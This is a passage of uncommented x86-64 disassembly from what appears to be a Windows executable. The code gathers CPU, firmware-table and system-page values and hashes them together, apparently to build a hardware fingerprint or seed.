   14003fe8d:	call   0x140064358
   14003fe92:	test   rax,rax
   14003fe95:	je     0x14003fea1
   14003fe97:	mov    rcx,rsi
   14003fe9a:	xor    edx,edx
   14003fe9c:	mov    r8,rdi
   14003fe9f:	call   rax
   14003fea1:	lea    rax,[rip+0x482f0]        # 0x140088198
   14003fea8:	mov    rax,QWORD PTR [r14+rax*1]
   14003feac:	mov    QWORD PTR [rbp+r14*4+0x7d0],rbx
   14003feb4:	mov    QWORD PTR [rbp+r14*4+0x7d8],rax
   14003febc:	mov    QWORD PTR [rbp+r14*4+0x7e0],rdi
   14003fec4:	and    rdi,0xfffffffffffffff0
   14003fec8:	mov    QWORD PTR [rbp+r14*4+0x7e8],rdi
   14003fed0:	add    r14,0x8
   14003fed4:	jmp    0x14003fe38
   14003fed9:	movabs r14,0x406aa9c82dbf9701
   14003fee3:	push   0x8
   14003fee5:	pop    rax
   14003fee6:	movabs rcx,0xf5f8efaeb9dc339f
   14003fef0:	cmp    rax,0xa8
   14003fef6:	je     0x14003ffd6
   14003fefc:	mov    rdx,r13
   14003feff:	xor    rdx,rcx
   14003ff02:	imul   rdx,r14
   14003ff06:	mov    r8,rdx
   14003ff09:	shr    r8,0x1d
   14003ff0d:	xor    r8,rdx
   14003ff10:	imul   r8,r12
   14003ff14:	mov    rdx,r8
   14003ff17:	shr    rdx,0x20
   14003ff1b:	xor    rdx,r8
   14003ff1e:	mov    r8,rcx
   14003ff21:	movabs r9,0x629eef0eeda7e1b9
   14003ff2b:	xor    r8,r9
   14003ff2e:	imul   r8,r14
   14003ff32:	mov    r10,r8
   14003ff35:	shr    r10,0x1d
   14003ff39:	xor    r10,r8
   14003ff3c:	imul   r10,r12
   14003ff40:	mov    r9,r10
   14003ff43:	shr    r9,0x20
   14003ff47:	xor    r9,r10
   14003ff4a:	mov    r10,rdx
   14003ff4d:	rol    r10,0x7
   14003ff51:	or     r9,0x1
   14003ff55:	mov    r11,rdx
   14003ff58:	rol    r11,0x29
   14003ff5c:	add    r10,rcx
   14003ff5f:	mov    r8,QWORD PTR [rbp+rax*1+0x7c8]
   14003ff67:	add    r8,r10
   14003ff6a:	imul   r8,r9
   14003ff6e:	add    r8,r13
   14003ff71:	add    r8,r15
   14003ff74:	mov    r15,rcx
   14003ff77:	rol    r15,0x20
   14003ff7b:	movabs rdi,0x6161c4ba7c2419b8
   14003ff85:	xor    r15,rdi
   14003ff88:	lea    rsi,[r11+r15*1]
   14003ff8c:	sub    r15,r10
   14003ff8f:	add    rsi,QWORD PTR [rbp+rax*1+0x7d0]
   14003ff97:	add    r15,r11
   14003ff9a:	imul   rsi,r9
   14003ff9e:	imul   r15,r9
   14003ffa2:	sub    r15,rdx
   14003ffa5:	sub    r15,rsi
   14003ffa8:	add    r15,r8
   14003ffab:	xor    rcx,rdi
   14003ffae:	imul   rcx,r14
   14003ffb2:	mov    r8,rcx
   14003ffb5:	shr    r8,0x1d
   14003ffb9:	xor    r8,rcx
   14003ffbc:	imul   r8,r12
   14003ffc0:	mov    rcx,r8
   14003ffc3:	shr    rcx,0x20
   14003ffc7:	xor    rcx,r8
   14003ffca:	add    rax,0x10
   14003ffce:	mov    r13,rdx
   14003ffd1:	jmp    0x14003fef0
   14003ffd6:	mov    eax,0x80000000
   14003ffdb:	xor    ecx,ecx
   14003ffdd:	mov    r8,rbx
   14003ffe0:	cpuid
   14003ffe2:	xchg   rbx,r8
   14003ffe5:	mov    r8d,eax
   14003ffe8:	mov    eax,0x80000008
   14003ffed:	cmp    r8d,eax
   14003fff0:	cmovae r8d,eax
   14003fff4:	xor    ecx,ecx
   14003fff6:	mov    eax,0x80000001
   14003fffb:	mov    r9,rbx
   14003fffe:	cpuid
   140040000:	xchg   rbx,r9
   140040003:	mov    r9d,edx
   140040006:	xor    ecx,ecx
   140040008:	xor    eax,eax
   14004000a:	mov    r10,rbx
   14004000d:	cpuid
   14004000f:	xchg   rbx,r10
   140040012:	cmp    r10d,0x68747541
   140040019:	je     0x140040058
   14004001b:	mov    r11b,0x1
   14004001e:	push   0x3
   140040020:	pop    rsi
   140040021:	cmp    r10d,0x756e6547
   140040028:	jne    0x14004005e
   14004002a:	xor    r11d,r11d
   14004002d:	push   0x1
   14004002f:	jmp    0x14004005d
   140040031:	push   0x8
   140040033:	pop    rax
   140040034:	cmp    rax,0xa8
   14004003a:	je     0x14003fee3
   140040040:	or     QWORD PTR [rbp+rax*1+0x7c8],0xffffffffffffffff
   140040049:	and    QWORD PTR [rbp+rax*1+0x7d0],0x0
   140040052:	add    rax,0x10
   140040056:	jmp    0x140040034
   140040058:	xor    r11d,r11d
   14004005b:	push   0x2
   14004005d:	pop    rsi
   14004005e:	and    r9d,0x20000800
   140040065:	movaps XMMWORD PTR [rbp+0xd30],xmm6
   14004006c:	movaps XMMWORD PTR [rbp+0xd20],xmm6
   140040073:	movaps XMMWORD PTR [rbp+0xd10],xmm6
   14004007a:	mov    r10d,0x80000002
   140040080:	xor    r14d,r14d
   140040083:	push   0xc
   140040085:	pop    rdi
   140040086:	test   r14b,0x1
   14004008a:	jne    0x1400400ee
   14004008c:	cmp    r10d,0x80000004
   140040093:	ja     0x1400400ee
   140040095:	xor    ecx,ecx
   140040097:	mov    eax,r10d
   14004009a:	mov    rbx,rbx
   14004009d:	cpuid
   14004009f:	xchg   rbx,rbx
   1400400a2:	cmp    rdi,0x3c
   1400400a6:	je     0x140048140
   1400400ac:	lea    r12d,[r10+0x1]
   1400400b0:	cmp    r10d,0x80000004
   1400400b7:	sete   r14b
   1400400bb:	cmove  r12d,r10d
   1400400bf:	mov    DWORD PTR [rbp+rdi*1+0xd04],eax
   1400400c6:	mov    DWORD PTR [rbp+rdi*1+0xd08],ebx
   1400400cd:	mov    DWORD PTR [rbp+rdi*1+0xd0c],ecx
   1400400d4:	mov    DWORD PTR [rbp+rdi*1+0xd10],edx
   1400400db:	add    rdi,0x10
   1400400df:	mov    r10d,r12d
   1400400e2:	movabs r12,0xeb591050d1f713a9
   1400400ec:	jmp    0x140040086
   1400400ee:	movaps xmm0,XMMWORD PTR [rbp+0xd10]
   1400400f5:	movaps xmm1,XMMWORD PTR [rbp+0xd20]
   1400400fc:	movaps xmm2,XMMWORD PTR [rbp+0xd30]
   140040103:	movaps XMMWORD PTR [rbp+0x7f0],xmm2
   14004010a:	movaps XMMWORD PTR [rbp+0x7e0],xmm1
   140040111:	movaps XMMWORD PTR [rbp+0x7d0],xmm0
   140040118:	push   0x4
   14004011a:	pop    rcx
   14004011b:	push   0x3
   14004011d:	pop    rax
   14004011e:	movabs rbx,0x406aa9c82dbf9701
   140040128:	push   0x2
   14004012a:	pop    r14
   14004012c:	cmp    rcx,0x30
   140040130:	je     0x140040181
   140040132:	movzx  r10d,WORD PTR [rbp+rcx*1+0x7cc]
   14004013b:	movzx  edx,BYTE PTR [rbp+rcx*1+0x7ce]
   140040143:	movzx  edi,BYTE PTR [rbp+rcx*1+0x7cf]
   14004014b:	shl    edi,0x18
   14004014e:	shl    edx,0x10
   140040151:	or     edx,r10d
   140040154:	or     edi,edx
   140040156:	cmp    edi,0x65746e49
   14004015c:	jne    0x14004016c
   14004015e:	cmp    BYTE PTR [rbp+rcx*1+0x7d0],0x6c
   140040166:	push   0x1
   140040168:	pop    r10
   14004016a:	je     0x140040179
   14004016c:	cmp    edx,0x444d41
   140040172:	cmove  rax,r14
   140040176:	mov    r10,rax
   140040179:	inc    rcx
   14004017c:	mov    rax,r10
   14004017f:	jmp    0x14004012c
   140040181:	mov    ecx,r8d
   140040184:	mov    edx,r9d
   140040187:	test   r11b,r11b
   14004018a:	push   0x3
   14004018c:	pop    r8
   14004018e:	cmovne rax,r8
   140040192:	mov    QWORD PTR [rbp+0xf80],rcx
   140040199:	mov    ecx,0x80000008
   14004019e:	mov    QWORD PTR [rbp+0xf88],rcx
   1400401a5:	mov    QWORD PTR [rbp+0xf90],rdx
   1400401ac:	mov    QWORD PTR [rbp+0xf98],0x20000800
   1400401b7:	mov    QWORD PTR [rbp+0xfa0],rsi
   1400401be:	mov    QWORD PTR [rbp+0xfa8],rax
   1400401c5:	push   0x8
   1400401c7:	pop    rax
   1400401c8:	movabs rcx,0x83cf5d5d177bb10c
   1400401d2:	cmp    rax,0x38
   1400401d6:	je     0x1400402b6
   1400401dc:	mov    rdx,r13
   1400401df:	xor    rdx,rcx
   1400401e2:	imul   rdx,rbx
   1400401e6:	mov    r8,rdx
   1400401e9:	shr    r8,0x1d
   1400401ed:	xor    r8,rdx
   1400401f0:	imul   r8,r12
   1400401f4:	mov    rdx,r8
   1400401f7:	shr    rdx,0x20
   1400401fb:	xor    rdx,r8
   1400401fe:	mov    r8,rcx
   140040201:	movabs r9,0x629eef0eeda7e1b9
   14004020b:	xor    r8,r9
   14004020e:	imul   r8,rbx
   140040212:	mov    r10,r8
   140040215:	shr    r10,0x1d
   140040219:	xor    r10,r8
   14004021c:	imul   r10,r12
   140040220:	mov    r9,r10
   140040223:	shr    r9,0x20
   140040227:	xor    r9,r10
   14004022a:	mov    r10,rdx
   14004022d:	rol    r10,0x7
   140040231:	or     r9,0x1
   140040235:	mov    r11,rdx
   140040238:	rol    r11,0x29
   14004023c:	add    r10,rcx
   14004023f:	mov    r8,QWORD PTR [rbp+rax*1+0xf78]
   140040247:	add    r8,r10
   14004024a:	imul   r8,r9
   14004024e:	add    r8,r13
   140040251:	add    r8,r15
   140040254:	mov    r15,rcx
   140040257:	rol    r15,0x20
   14004025b:	movabs rdi,0x6161c4ba7c2419b8
   140040265:	xor    r15,rdi
   140040268:	lea    rsi,[r11+r15*1]
   14004026c:	sub    r15,r10
   14004026f:	add    rsi,QWORD PTR [rbp+rax*1+0xf80]
   140040277:	add    r15,r11
   14004027a:	imul   rsi,r9
   14004027e:	imul   r15,r9
   140040282:	sub    r15,rdx
   140040285:	sub    r15,rsi
   140040288:	add    r15,r8
   14004028b:	xor    rcx,rdi
   14004028e:	imul   rcx,rbx
   140040292:	mov    r8,rcx
   140040295:	shr    r8,0x1d
   140040299:	xor    r8,rcx
   14004029c:	imul   r8,r12
   1400402a0:	mov    rcx,r8
   1400402a3:	shr    rcx,0x20
   1400402a7:	xor    rcx,r8
   1400402aa:	add    rax,0x10
   1400402ae:	mov    r13,rdx
   1400402b1:	jmp    0x1400401d2
   1400402b6:	push   0x1
   1400402b8:	pop    rax
   1400402b9:	xor    ecx,ecx
   1400402bb:	mov    r8,rbx
   1400402be:	cpuid
   1400402c0:	xchg   rbx,r8
   1400402c3:	mov    DWORD PTR [rbp+0x1180],ecx
   1400402c9:	xor    ecx,ecx
   1400402cb:	mov    eax,0x80000001
   1400402d0:	mov    r8,rbx
   1400402d3:	cpuid
   1400402d5:	xchg   rbx,r8
   1400402d8:	mov    QWORD PTR [rbp+0x1170],rdx
   1400402df:	movabs rax,0xc0000000d
   1400402e9:	mov    QWORD PTR [rbp+0xd10],rax
   1400402f0:	mov    DWORD PTR [rbp+0xd18],0x11
   1400402fa:	xor    esi,esi
   1400402fc:	xor    r12d,r12d
   1400402ff:	xor    ebx,ebx
   140040301:	cmp    rsi,0x3
   140040305:	je     0x14004035c
   140040307:	mov    edi,DWORD PTR [rbp+rsi*4+0xd10]
   14004030e:	xor    r14d,r14d
   140040311:	cmp    BYTE PTR [rdi+0x7ffe0274],0x0
   140040318:	setne  r14b
   14004031c:	mov    ecx,esi
   14004031e:	shl    r14,cl
   140040321:	lea    rcx,[rip+0x58858]        # 0x140098b80
   140040328:	mov    edx,0xba7c2f
   14004032d:	mov    r8d,0xb896b5e1
   140040333:	call   0x140064358
   140040338:	test   rax,rax
   14004033b:	je     0x14004034a
   14004033d:	mov    ecx,edi
   14004033f:	call   rax
   140040341:	xor    edx,edx
   140040343:	test   eax,eax
   140040345:	setne  dl
   140040348:	jmp    0x14004034c
   14004034a:	xor    edx,edx
   14004034c:	mov    ecx,esi
   14004034e:	shl    rdx,cl
   140040351:	or     rbx,r14
   140040354:	or     r12,rdx
   140040357:	inc    rsi
   14004035a:	jmp    0x140040301
   14004035c:	mov    eax,DWORD PTR [rbp+0x1180]
   140040362:	mov    r14d,eax
   140040365:	shr    r14d,0x1b
   140040369:	mov    rdi,QWORD PTR ds:0x7ffe03d8
   140040371:	mov    rsi,rdi
   140040374:	and    r14d,0x1
   140040378:	je     0x1400403ec
   14004037a:	mov    al,BYTE PTR [rip+0x58838]        # 0x140098bb8
   140040380:	cmp    al,0x1
   140040382:	je     0x1400403a6
   140040384:	movzx  eax,al
   140040387:	push   0xffffffffffffffff
   140040389:	pop    rsi
   14004038a:	test   eax,eax
   14004038c:	jne    0x1400403ec
   14004038e:	call   0x140065d51
   140040393:	test   rax,rax
   140040396:	sete   cl
   140040399:	inc    cl
   14004039b:	mov    BYTE PTR [rip+0x58817],cl        # 0x140098bb8
   1400403a1:	test   rax,rax
   1400403a4:	je     0x1400403ec
   1400403a6:	call   0x140064227
   1400403ab:	mov    eax,0x7193e62b
   1400403b0:	xchg   DWORD PTR [rip+0x5872a],eax        # 0x140098ae0
   1400403b6:	xor    ecx,ecx
   1400403b8:	push   0xffffffffffffffff
   1400403ba:	pop    rax
   1400403bb:	mov    edx,eax
   1400403bd:	mov    r8,rdi
   1400403c0:	lea    rsi,[rip+0x7]        # 0x1400403ce
   1400403c7:	lea    rdi,[rip+0x3]        # 0x1400403d1
   1400403ce:	xgetbv
   1400403d1:	mov    rdi,r8
   1400403d4:	xor    ecx,ecx
   1400403d6:	xchg   DWORD PTR [rip+0x58704],ecx        # 0x140098ae0
   1400403dc:	shl    rdx,0x20
   1400403e0:	mov    esi,eax
   1400403e2:	or     rsi,rdx
   1400403e5:	mov    BYTE PTR [rip+0x586a2],0x0        # 0x140098a8e
   1400403ec:	lea    rcx,[rip+0x5876d]        # 0x140098b60
   1400403f3:	mov    edx,0xba7c2f
   1400403f8:	mov    r8d,0xa7faf918
   1400403fe:	call   0x140064358
   140040403:	test   rax,rax
   140040406:	je     0x14004040f
   140040408:	call   rax
   14004040a:	and    rax,rdi
   14004040d:	jmp    0x140040411
   14004040f:	xor    eax,eax
   140040411:	mov    ecx,DWORD PTR [rbp+0x1180]
   140040417:	and    ecx,0x1
   14004041a:	mov    rdx,QWORD PTR [rbp+0x1170]
   140040421:	shr    edx,0x13
   140040424:	and    edx,0x2
   140040427:	or     edx,ecx
   140040429:	lea    ecx,[rdx+r14*4]
   14004042d:	mov    QWORD PTR [rbp+0x7d0],rcx
   140040434:	mov    QWORD PTR [rbp+0x7d8],rbx
   14004043b:	mov    QWORD PTR [rbp+0x7e0],rbx
   140040442:	mov    QWORD PTR [rbp+0x7e8],r12
   140040449:	mov    QWORD PTR [rbp+0x7f0],rsi
   140040450:	mov    QWORD PTR [rbp+0x7f8],rdi
   140040457:	mov    QWORD PTR [rbp+0x800],rax
   14004045e:	mov    QWORD PTR [rbp+0x808],rdi
   140040465:	xor    eax,eax
   140040467:	movabs rcx,0x5263b97ebb8ecbab
   140040471:	movabs rdi,0x406aa9c82dbf9701
   14004047b:	movabs rbx,0xeb591050d1f713a9
   140040485:	cmp    rax,0x40
   140040489:	je     0x140040569
   14004048f:	mov    rdx,r13
   140040492:	xor    rdx,rcx
   140040495:	imul   rdx,rdi
   140040499:	mov    r8,rdx
   14004049c:	shr    r8,0x1d
   1400404a0:	xor    r8,rdx
   1400404a3:	imul   r8,rbx
   1400404a7:	mov    rdx,r8
   1400404aa:	shr    rdx,0x20
   1400404ae:	xor    rdx,r8
   1400404b1:	mov    r8,rcx
   1400404b4:	movabs r9,0x629eef0eeda7e1b9
   1400404be:	xor    r8,r9
   1400404c1:	imul   r8,rdi
   1400404c5:	mov    r10,r8
   1400404c8:	shr    r10,0x1d
   1400404cc:	xor    r10,r8
   1400404cf:	imul   r10,rbx
   1400404d3:	mov    r9,r10
   1400404d6:	shr    r9,0x20
   1400404da:	xor    r9,r10
   1400404dd:	mov    r10,rdx
   1400404e0:	rol    r10,0x7
   1400404e4:	or     r9,0x1
   1400404e8:	mov    r11,rdx
   1400404eb:	rol    r11,0x29
   1400404ef:	add    r10,rcx
   1400404f2:	mov    r8,QWORD PTR [rbp+rax*1+0x7d0]
   1400404fa:	add    r8,r10
   1400404fd:	imul   r8,r9
   140040501:	add    r8,r13
   140040504:	add    r8,r15
   140040507:	mov    r15,rcx
   14004050a:	rol    r15,0x20
   14004050e:	movabs r14,0x6161c4ba7c2419b8
   140040518:	xor    r15,r14
   14004051b:	lea    rsi,[r11+r15*1]
   14004051f:	sub    r15,r10
   140040522:	add    rsi,QWORD PTR [rbp+rax*1+0x7d8]
   14004052a:	add    r15,r11
   14004052d:	imul   rsi,r9
   140040531:	imul   r15,r9
   140040535:	sub    r15,rdx
   140040538:	sub    r15,rsi
   14004053b:	add    r15,r8
   14004053e:	xor    rcx,r14
   140040541:	imul   rcx,rdi
   140040545:	mov    r8,rcx
   140040548:	shr    r8,0x1d
   14004054c:	xor    r8,rcx
   14004054f:	imul   r8,rbx
   140040553:	mov    rcx,r8
   140040556:	shr    rcx,0x20
   14004055a:	xor    rcx,r8
   14004055d:	add    rax,0x10
   140040561:	mov    r13,rdx
   140040564:	jmp    0x140040485
   140040569:	xor    eax,eax
   14004056b:	cmp    rax,0x20
   14004056f:	je     0x140040589
   140040571:	or     QWORD PTR [rbp+rax*1+0xd10],0xffffffffffffffff
   14004057a:	and    QWORD PTR [rbp+rax*1+0xd18],0x0
   140040583:	add    rax,0x10
   140040587:	jmp    0x14004056b
   140040589:	mov    rax,QWORD PTR [rbp+0x6b0]
   140040590:	mov    rax,QWORD PTR [rax+0x30]
   140040594:	mov    QWORD PTR [rbp+0x1180],rax
   14004059b:	xor    esi,esi
   14004059d:	mov    QWORD PTR [rbp+0x1170],0x0
   1400405a8:	push   0xffffffffffffffff
   1400405aa:	pop    rax
   1400405ab:	mov    QWORD PTR [rbp+0x1178],rax
   1400405b2:	mov    r12,rsi
   1400405b5:	shl    r12,0x4
   1400405b9:	lea    rax,[rbp+0xd00]
   1400405c0:	add    r12,rax
   1400405c3:	cmp    rsi,0x1
   1400405c7:	ja     0x14004076a
   1400405cd:	mov    r14,rsi
   1400405d0:	jne    0x1400405fc
   1400405d2:	lea    rcx,[rip+0x5856f]        # 0x140098b48
   1400405d9:	mov    edx,0xba7c2f
   1400405de:	mov    r8d,0xc6724b05
   1400405e4:	call   0x140064358
   1400405e9:	test   rax,rax
   1400405ec:	je     0x14004062b
   1400405ee:	mov    ecx,0x41435049
   1400405f3:	xor    edx,edx
   1400405f5:	xor    r8d,r8d
   1400405f8:	call   rax
   1400405fa:	jmp    0x140040627
   1400405fc:	lea    rcx,[rip+0x58575]        # 0x140098b78
   140040603:	mov    edx,0xba7c2f
   140040608:	mov    r8d,0x7ec418d7
   14004060e:	call   0x140064358
   140040613:	test   rax,rax
   140040616:	je     0x14004062b
   140040618:	mov    ecx,0x52534d42
   14004061d:	xor    edx,edx
   14004061f:	xor    r8d,r8d
   140040622:	xor    r9d,r9d
   140040625:	call   rax
   140040627:	mov    edi,eax
   140040629:	jmp    0x14004062d
   14004062b:	xor    edi,edi
   14004062d:	cmp    QWORD PTR [rbp+0x1180],0x0
   140040635:	sete   al
   140040638:	mov    ebx,edi
   14004063a:	mov    QWORD PTR [r12+0x18],rbx
   14004063f:	cmp    edi,0x8
   140040642:	setb   cl
   140040645:	or     cl,al
   140040647:	jne    0x140040678
   140040649:	lea    rcx,[rip+0x58460]        # 0x140098ab0
   140040650:	mov    edx,0xba7c2f
   140040655:	mov    r8d,0xa86f2af6
   14004065b:	call   0x140064358
   140040660:	test   rax,rax
   140040663:	je     0x140040678
   140040665:	mov    rcx,QWORD PTR [rbp+0x1180]
   14004066c:	xor    edx,edx
   14004066e:	mov    r8,rbx
   140040671:	call   rax
   140040673:	mov    rbx,rax
   140040676:	jmp    0x14004067a
   140040678:	xor    ebx,ebx
   14004067a:	add    r12,0x10
   14004067e:	lea    rsi,[r14+0x1]
   140040682:	test   rbx,rbx
   140040685:	je     0x1400405c3
   14004068b:	cmp    r14,0x1
   14004068f:	jne    0x1400406be
   140040691:	lea    rcx,[rip+0x584b0]        # 0x140098b48
   140040698:	mov    edx,0xba7c2f
   14004069d:	mov    r8d,0xc6724b05
   1400406a3:	call   0x140064358
   1400406a8:	test   rax,rax
   1400406ab:	je     0x1400406ed
   1400406ad:	mov    ecx,0x41435049
   1400406b2:	mov    rdx,rbx
   1400406b5:	mov    r8d,edi
   1400406b8:	call   rax
   1400406ba:	mov    eax,eax
   1400406bc:	jmp    0x1400406ef
   1400406be:	lea    rcx,[rip+0x584b3]        # 0x140098b78
   1400406c5:	mov    edx,0xba7c2f
   1400406ca:	mov    r8d,0x7ec418d7
   1400406d0:	call   0x140064358
   1400406d5:	test   rax,rax
   1400406d8:	je     0x140040723
   1400406da:	mov    ecx,0x52534d42
   1400406df:	xor    edx,edx
   1400406e1:	mov    r8,rbx
   1400406e4:	mov    r9d,edi
   1400406e7:	call   rax
   1400406e9:	mov    eax,eax
   1400406eb:	jmp    0x140040725
   1400406ed:	xor    eax,eax
   1400406ef:	mov    ecx,0x50434146
   1400406f4:	mov    QWORD PTR [r12],rax
   1400406f8:	shr    edi,0x2
   1400406fb:	xor    eax,eax
   1400406fd:	mov    rdx,QWORD PTR [rbp+0x1170]
   140040704:	cmp    rdi,rax
   140040707:	je     0x14004071a
   140040709:	cmp    DWORD PTR [rbx+rax*4],0x50434146
   140040710:	lea    rax,[rax+0x1]
   140040714:	cmove  rdx,rcx
   140040718:	jmp    0x140040704
   14004071a:	mov    QWORD PTR [rbp+0x1170],rdx
   140040721:	jmp    0x140040737
   140040723:	xor    eax,eax
   140040725:	mov    QWORD PTR [r12],rax
   140040729:	mov    eax,DWORD PTR [rbx+0x4]
   14004072c:	add    rax,0x8
   140040730:	mov    QWORD PTR [rbp+0x1178],rax
   140040737:	lea    rcx,[rip+0x5837a]        # 0x140098ab8
   14004073e:	mov    edx,0xba7c2f
   140040743:	mov    r8d,0xb05949f4
   140040749:	call   0x140064358
   14004074e:	test   rax,rax
   140040751:	je     0x1400405b2
   140040757:	mov    rcx,QWORD PTR [rbp+0x1180]
   14004075e:	xor    edx,edx
   140040760:	mov    r8,rbx
   140040763:	call   rax
   140040765:	jmp    0x1400405b2
   14004076a:	mov    rax,QWORD PTR [rbp+0xd10]
   140040771:	mov    rcx,QWORD PTR [rbp+0xd18]
   140040778:	push   0x40
   14004077a:	pop    r8
   14004077c:	cmp    rcx,r8
   14004077f:	mov    rdx,r8
   140040782:	cmovb  rdx,rcx
   140040786:	movups xmm0,XMMWORD PTR [rbp+0xd20]
   14004078d:	mov    QWORD PTR [rbp+0x7d0],rax
   140040794:	mov    QWORD PTR [rbp+0x7d8],rcx
   14004079b:	mov    rax,QWORD PTR [rbp+0x1178]
   1400407a2:	mov    QWORD PTR [rbp+0x7e0],rax
   1400407a9:	mov    QWORD PTR [rbp+0x7e8],rcx
   1400407b0:	mov    QWORD PTR [rbp+0x7f0],rdx
   1400407b7:	mov    QWORD PTR [rbp+0x7f8],r8
   1400407be:	movups XMMWORD PTR [rbp+0x800],xmm0
   1400407c5:	mov    rax,QWORD PTR [rbp+0x1170]
   1400407cc:	mov    QWORD PTR [rbp+0x810],rax
   1400407d3:	mov    QWORD PTR [rbp+0x818],0x50434146
   1400407de:	push   0x8
   1400407e0:	pop    rax
   1400407e1:	movabs rcx,0x1fc8fd373340ab2a
   1400407eb:	movabs rdi,0x406aa9c82dbf9701
   1400407f5:	movabs rbx,0xeb591050d1f713a9
   1400407ff:	cmp    rax,0x58
   140040803:	je     0x1400408e3
   140040809:	mov    rdx,r13
   14004080c:	xor    rdx,rcx
   14004080f:	imul   rdx,rdi
   140040813:	mov    r8,rdx
   140040816:	shr    r8,0x1d
   14004081a:	xor    r8,rdx
   14004081d:	imul   r8,rbx
   140040821:	mov    rdx,r8
   140040824:	shr    rdx,0x20
   140040828:	xor    rdx,r8
   14004082b:	mov    r8,rcx
   14004082e:	movabs r9,0x629eef0eeda7e1b9
   140040838:	xor    r8,r9
   14004083b:	imul   r8,rdi
   14004083f:	mov    r10,r8
   140040842:	shr    r10,0x1d
   140040846:	xor    r10,r8
   140040849:	imul   r10,rbx
   14004084d:	mov    r9,r10
   140040850:	shr    r9,0x20
   140040854:	xor    r9,r10
   140040857:	mov    r10,rdx
   14004085a:	rol    r10,0x7
   14004085e:	or     r9,0x1
   140040862:	mov    r11,rdx
   140040865:	rol    r11,0x29
   140040869:	add    r10,rcx
   14004086c:	mov    r8,QWORD PTR [rbp+rax*1+0x7c8]
   140040874:	add    r8,r10
   140040877:	imul   r8,r9
   14004087b:	add    r8,r13
   14004087e:	add    r8,r15
   140040881:	mov    r15,rcx
   140040884:	rol    r15,0x20
   140040888:	movabs r14,0x6161c4ba7c2419b8
   140040892:	xor    r15,r14
   140040895:	lea    rsi,[r11+r15*1]
   140040899:	sub    r15,r10
   14004089c:	add    rsi,QWORD PTR [rbp+rax*1+0x7d0]
   1400408a4:	add    r15,r11
   1400408a7:	imul   rsi,r9
   1400408ab:	imul   r15,r9
   1400408af:	sub    r15,rdx
   1400408b2:	sub    r15,rsi
   1400408b5:	add    r15,r8
   1400408b8:	xor    rcx,r14
   1400408bb:	imul   rcx,rdi
   1400408bf:	mov    r8,rcx
   1400408c2:	shr    r8,0x1d
   1400408c6:	xor    r8,rcx
   1400408c9:	imul   r8,rbx
   1400408cd:	mov    rcx,r8
   1400408d0:	shr    rcx,0x20
   1400408d4:	xor    rcx,r8
   1400408d7:	add    rax,0x10
   1400408db:	mov    r13,rdx
   1400408de:	jmp    0x1400407ff
   1400408e3:	mov    ebx,DWORD PTR ds:0x7ffe026c
   1400408ea:	mov    r14d,DWORD PTR ds:0x7ffe0270
   1400408f2:	mov    eax,DWORD PTR ds:0x7ffe0260
   1400408f9:	mov    QWORD PTR [rbp+0x1170],rax
   140040900:	mov    ecx,0x110
   140040905:	xor    eax,eax
   140040907:	lea    rdi,[rbp+0x7d4]
   14004090e:	rep stos BYTE PTR [rdi],al
   140040910:	mov    DWORD PTR [rbp+0x7d0],0x114
   14004091a:	lea    rcx,[rip+0x58207]        # 0x140098b28
   140040921:	mov    edx,0x9394fb88
   140040926:	mov    r8d,0xb7cb6cdb
   14004092c:	call   0x140064358
   140040931:	test   rax,rax
   140040934:	je     0x14004093f
   140040936:	lea    rcx,[rbp+0x7d0]
   14004093d:	call   rax
   14004093f:	movzx  eax,WORD PTR [rbp+0x7dc]
   140040946:	mov    QWORD PTR [rbp+0x1140],rax
   14004094d:	mov    r12d,DWORD PTR [rbp+0x7d4]
   140040954:	mov    esi,DWORD PTR [rbp+0x7d8]
   14004095a:	mov    rax,QWORD PTR [rbp+0x6b0]
   140040961:	movzx  ecx,WORD PTR [rax+0x120]
   140040968:	mov    QWORD PTR [rbp+0x1178],rcx
   14004096f:	mov    ecx,DWORD PTR [rax+0x118]
   140040975:	mov    QWORD PTR [rbp+0x1158],rcx
   14004097c:	mov    edi,DWORD PTR [rax+0x11c]
   140040982:	movaps XMMWORD PTR [rbp+0x420],xmm6
   140040989:	movaps XMMWORD PTR [rbp+0x410],xmm6
   140040990:	movaps XMMWORD PTR [rbp+0x400],xmm6
   140040997:	lea    rcx,[rbp+0x400]
   14004099e:	call   0x14006487c
   1400409a3:	mov    ecx,DWORD PTR [rbp+0x420]
   1400409a9:	mov    al,BYTE PTR ds:0x7ffe03c4
   1400409b0:	mov    rdx,rcx
   1400409b3:	mov    QWORD PTR [rbp+0x1180],rcx
   1400409ba:	cmp    al,0x1
   1400409bc:	jne    0x1400409d2
   1400409be:	mov    ecx,DWORD PTR ds:0x7ffe03c0
   1400409c5:	mov    rax,QWORD PTR [rbp+0x6b0]
   1400409cc:	mov    edx,DWORD PTR [rax+0xb8]
   1400409d2:	shl    rbx,0x28
   1400409d6:	shl    r14,0x20
   1400409da:	or     r14,rbx
   1400409dd:	movzx  ebx,WORD PTR [rbp+0x1170]
   1400409e4:	or     rbx,r14
   1400409e7:	shl    r12,0x28
   1400409eb:	shl    rsi,0x20
   1400409ef:	or     rsi,r12
   1400409f2:	add    rsi,QWORD PTR [rbp+0x1140]
   1400409f9:	mov    rax,QWORD PTR [rbp+0x1158]
   140040a00:	shl    rax,0x28
   140040a04:	shl    rdi,0x20
   140040a08:	or     rdi,rax
   140040a0b:	add    rdi,QWORD PTR [rbp+0x1178]
   140040a12:	movaps XMMWORD PTR [rbp+0xf80],xmm6
   140040a19:	movaps XMMWORD PTR [rbp+0xfb0],xmm6
   140040a20:	movaps XMMWORD PTR [rbp+0xfa0],xmm6
   140040a27:	movaps XMMWORD PTR [rbp+0xf90],xmm6
   140040a2e:	mov    DWORD PTR [rbp+0xf80],0x40
   140040a38:	mov    r12,rcx
   140040a3b:	lea    rcx,[rbp+0xf80]
   140040a42:	mov    r14,rdx
   140040a45:	call   0x140065f57
   140040a4a:	mov    eax,DWORD PTR ds:0x7ffe02e8
   140040a51:	mov    rcx,QWORD PTR [rbp+0xf88]
   140040a58:	shr    rcx,0xc
   140040a5c:	mov    QWORD PTR [rbp+0xd10],rbx
   140040a63:	mov    QWORD PTR [rbp+0xd18],rsi
   140040a6a:	mov    QWORD PTR [rbp+0xd20],rbx
   140040a71:	mov    QWORD PTR [rbp+0xd28],rdi
   140040a78:	mov    QWORD PTR [rbp+0xd30],r12
   140040a7f:	mov    rdx,QWORD PTR [rbp+0x1180]
   140040a86:	mov    QWORD PTR [rbp+0xd38],rdx
   140040a8d:	mov    QWORD PTR [rbp+0xd40],r14
   140040a94:	mov    QWORD PTR [rbp+0xd48],rdx
   140040a9b:	mov    QWORD PTR [rbp+0xd50],rax
   140040aa2:	mov    QWORD PTR [rbp+0xd58],rcx
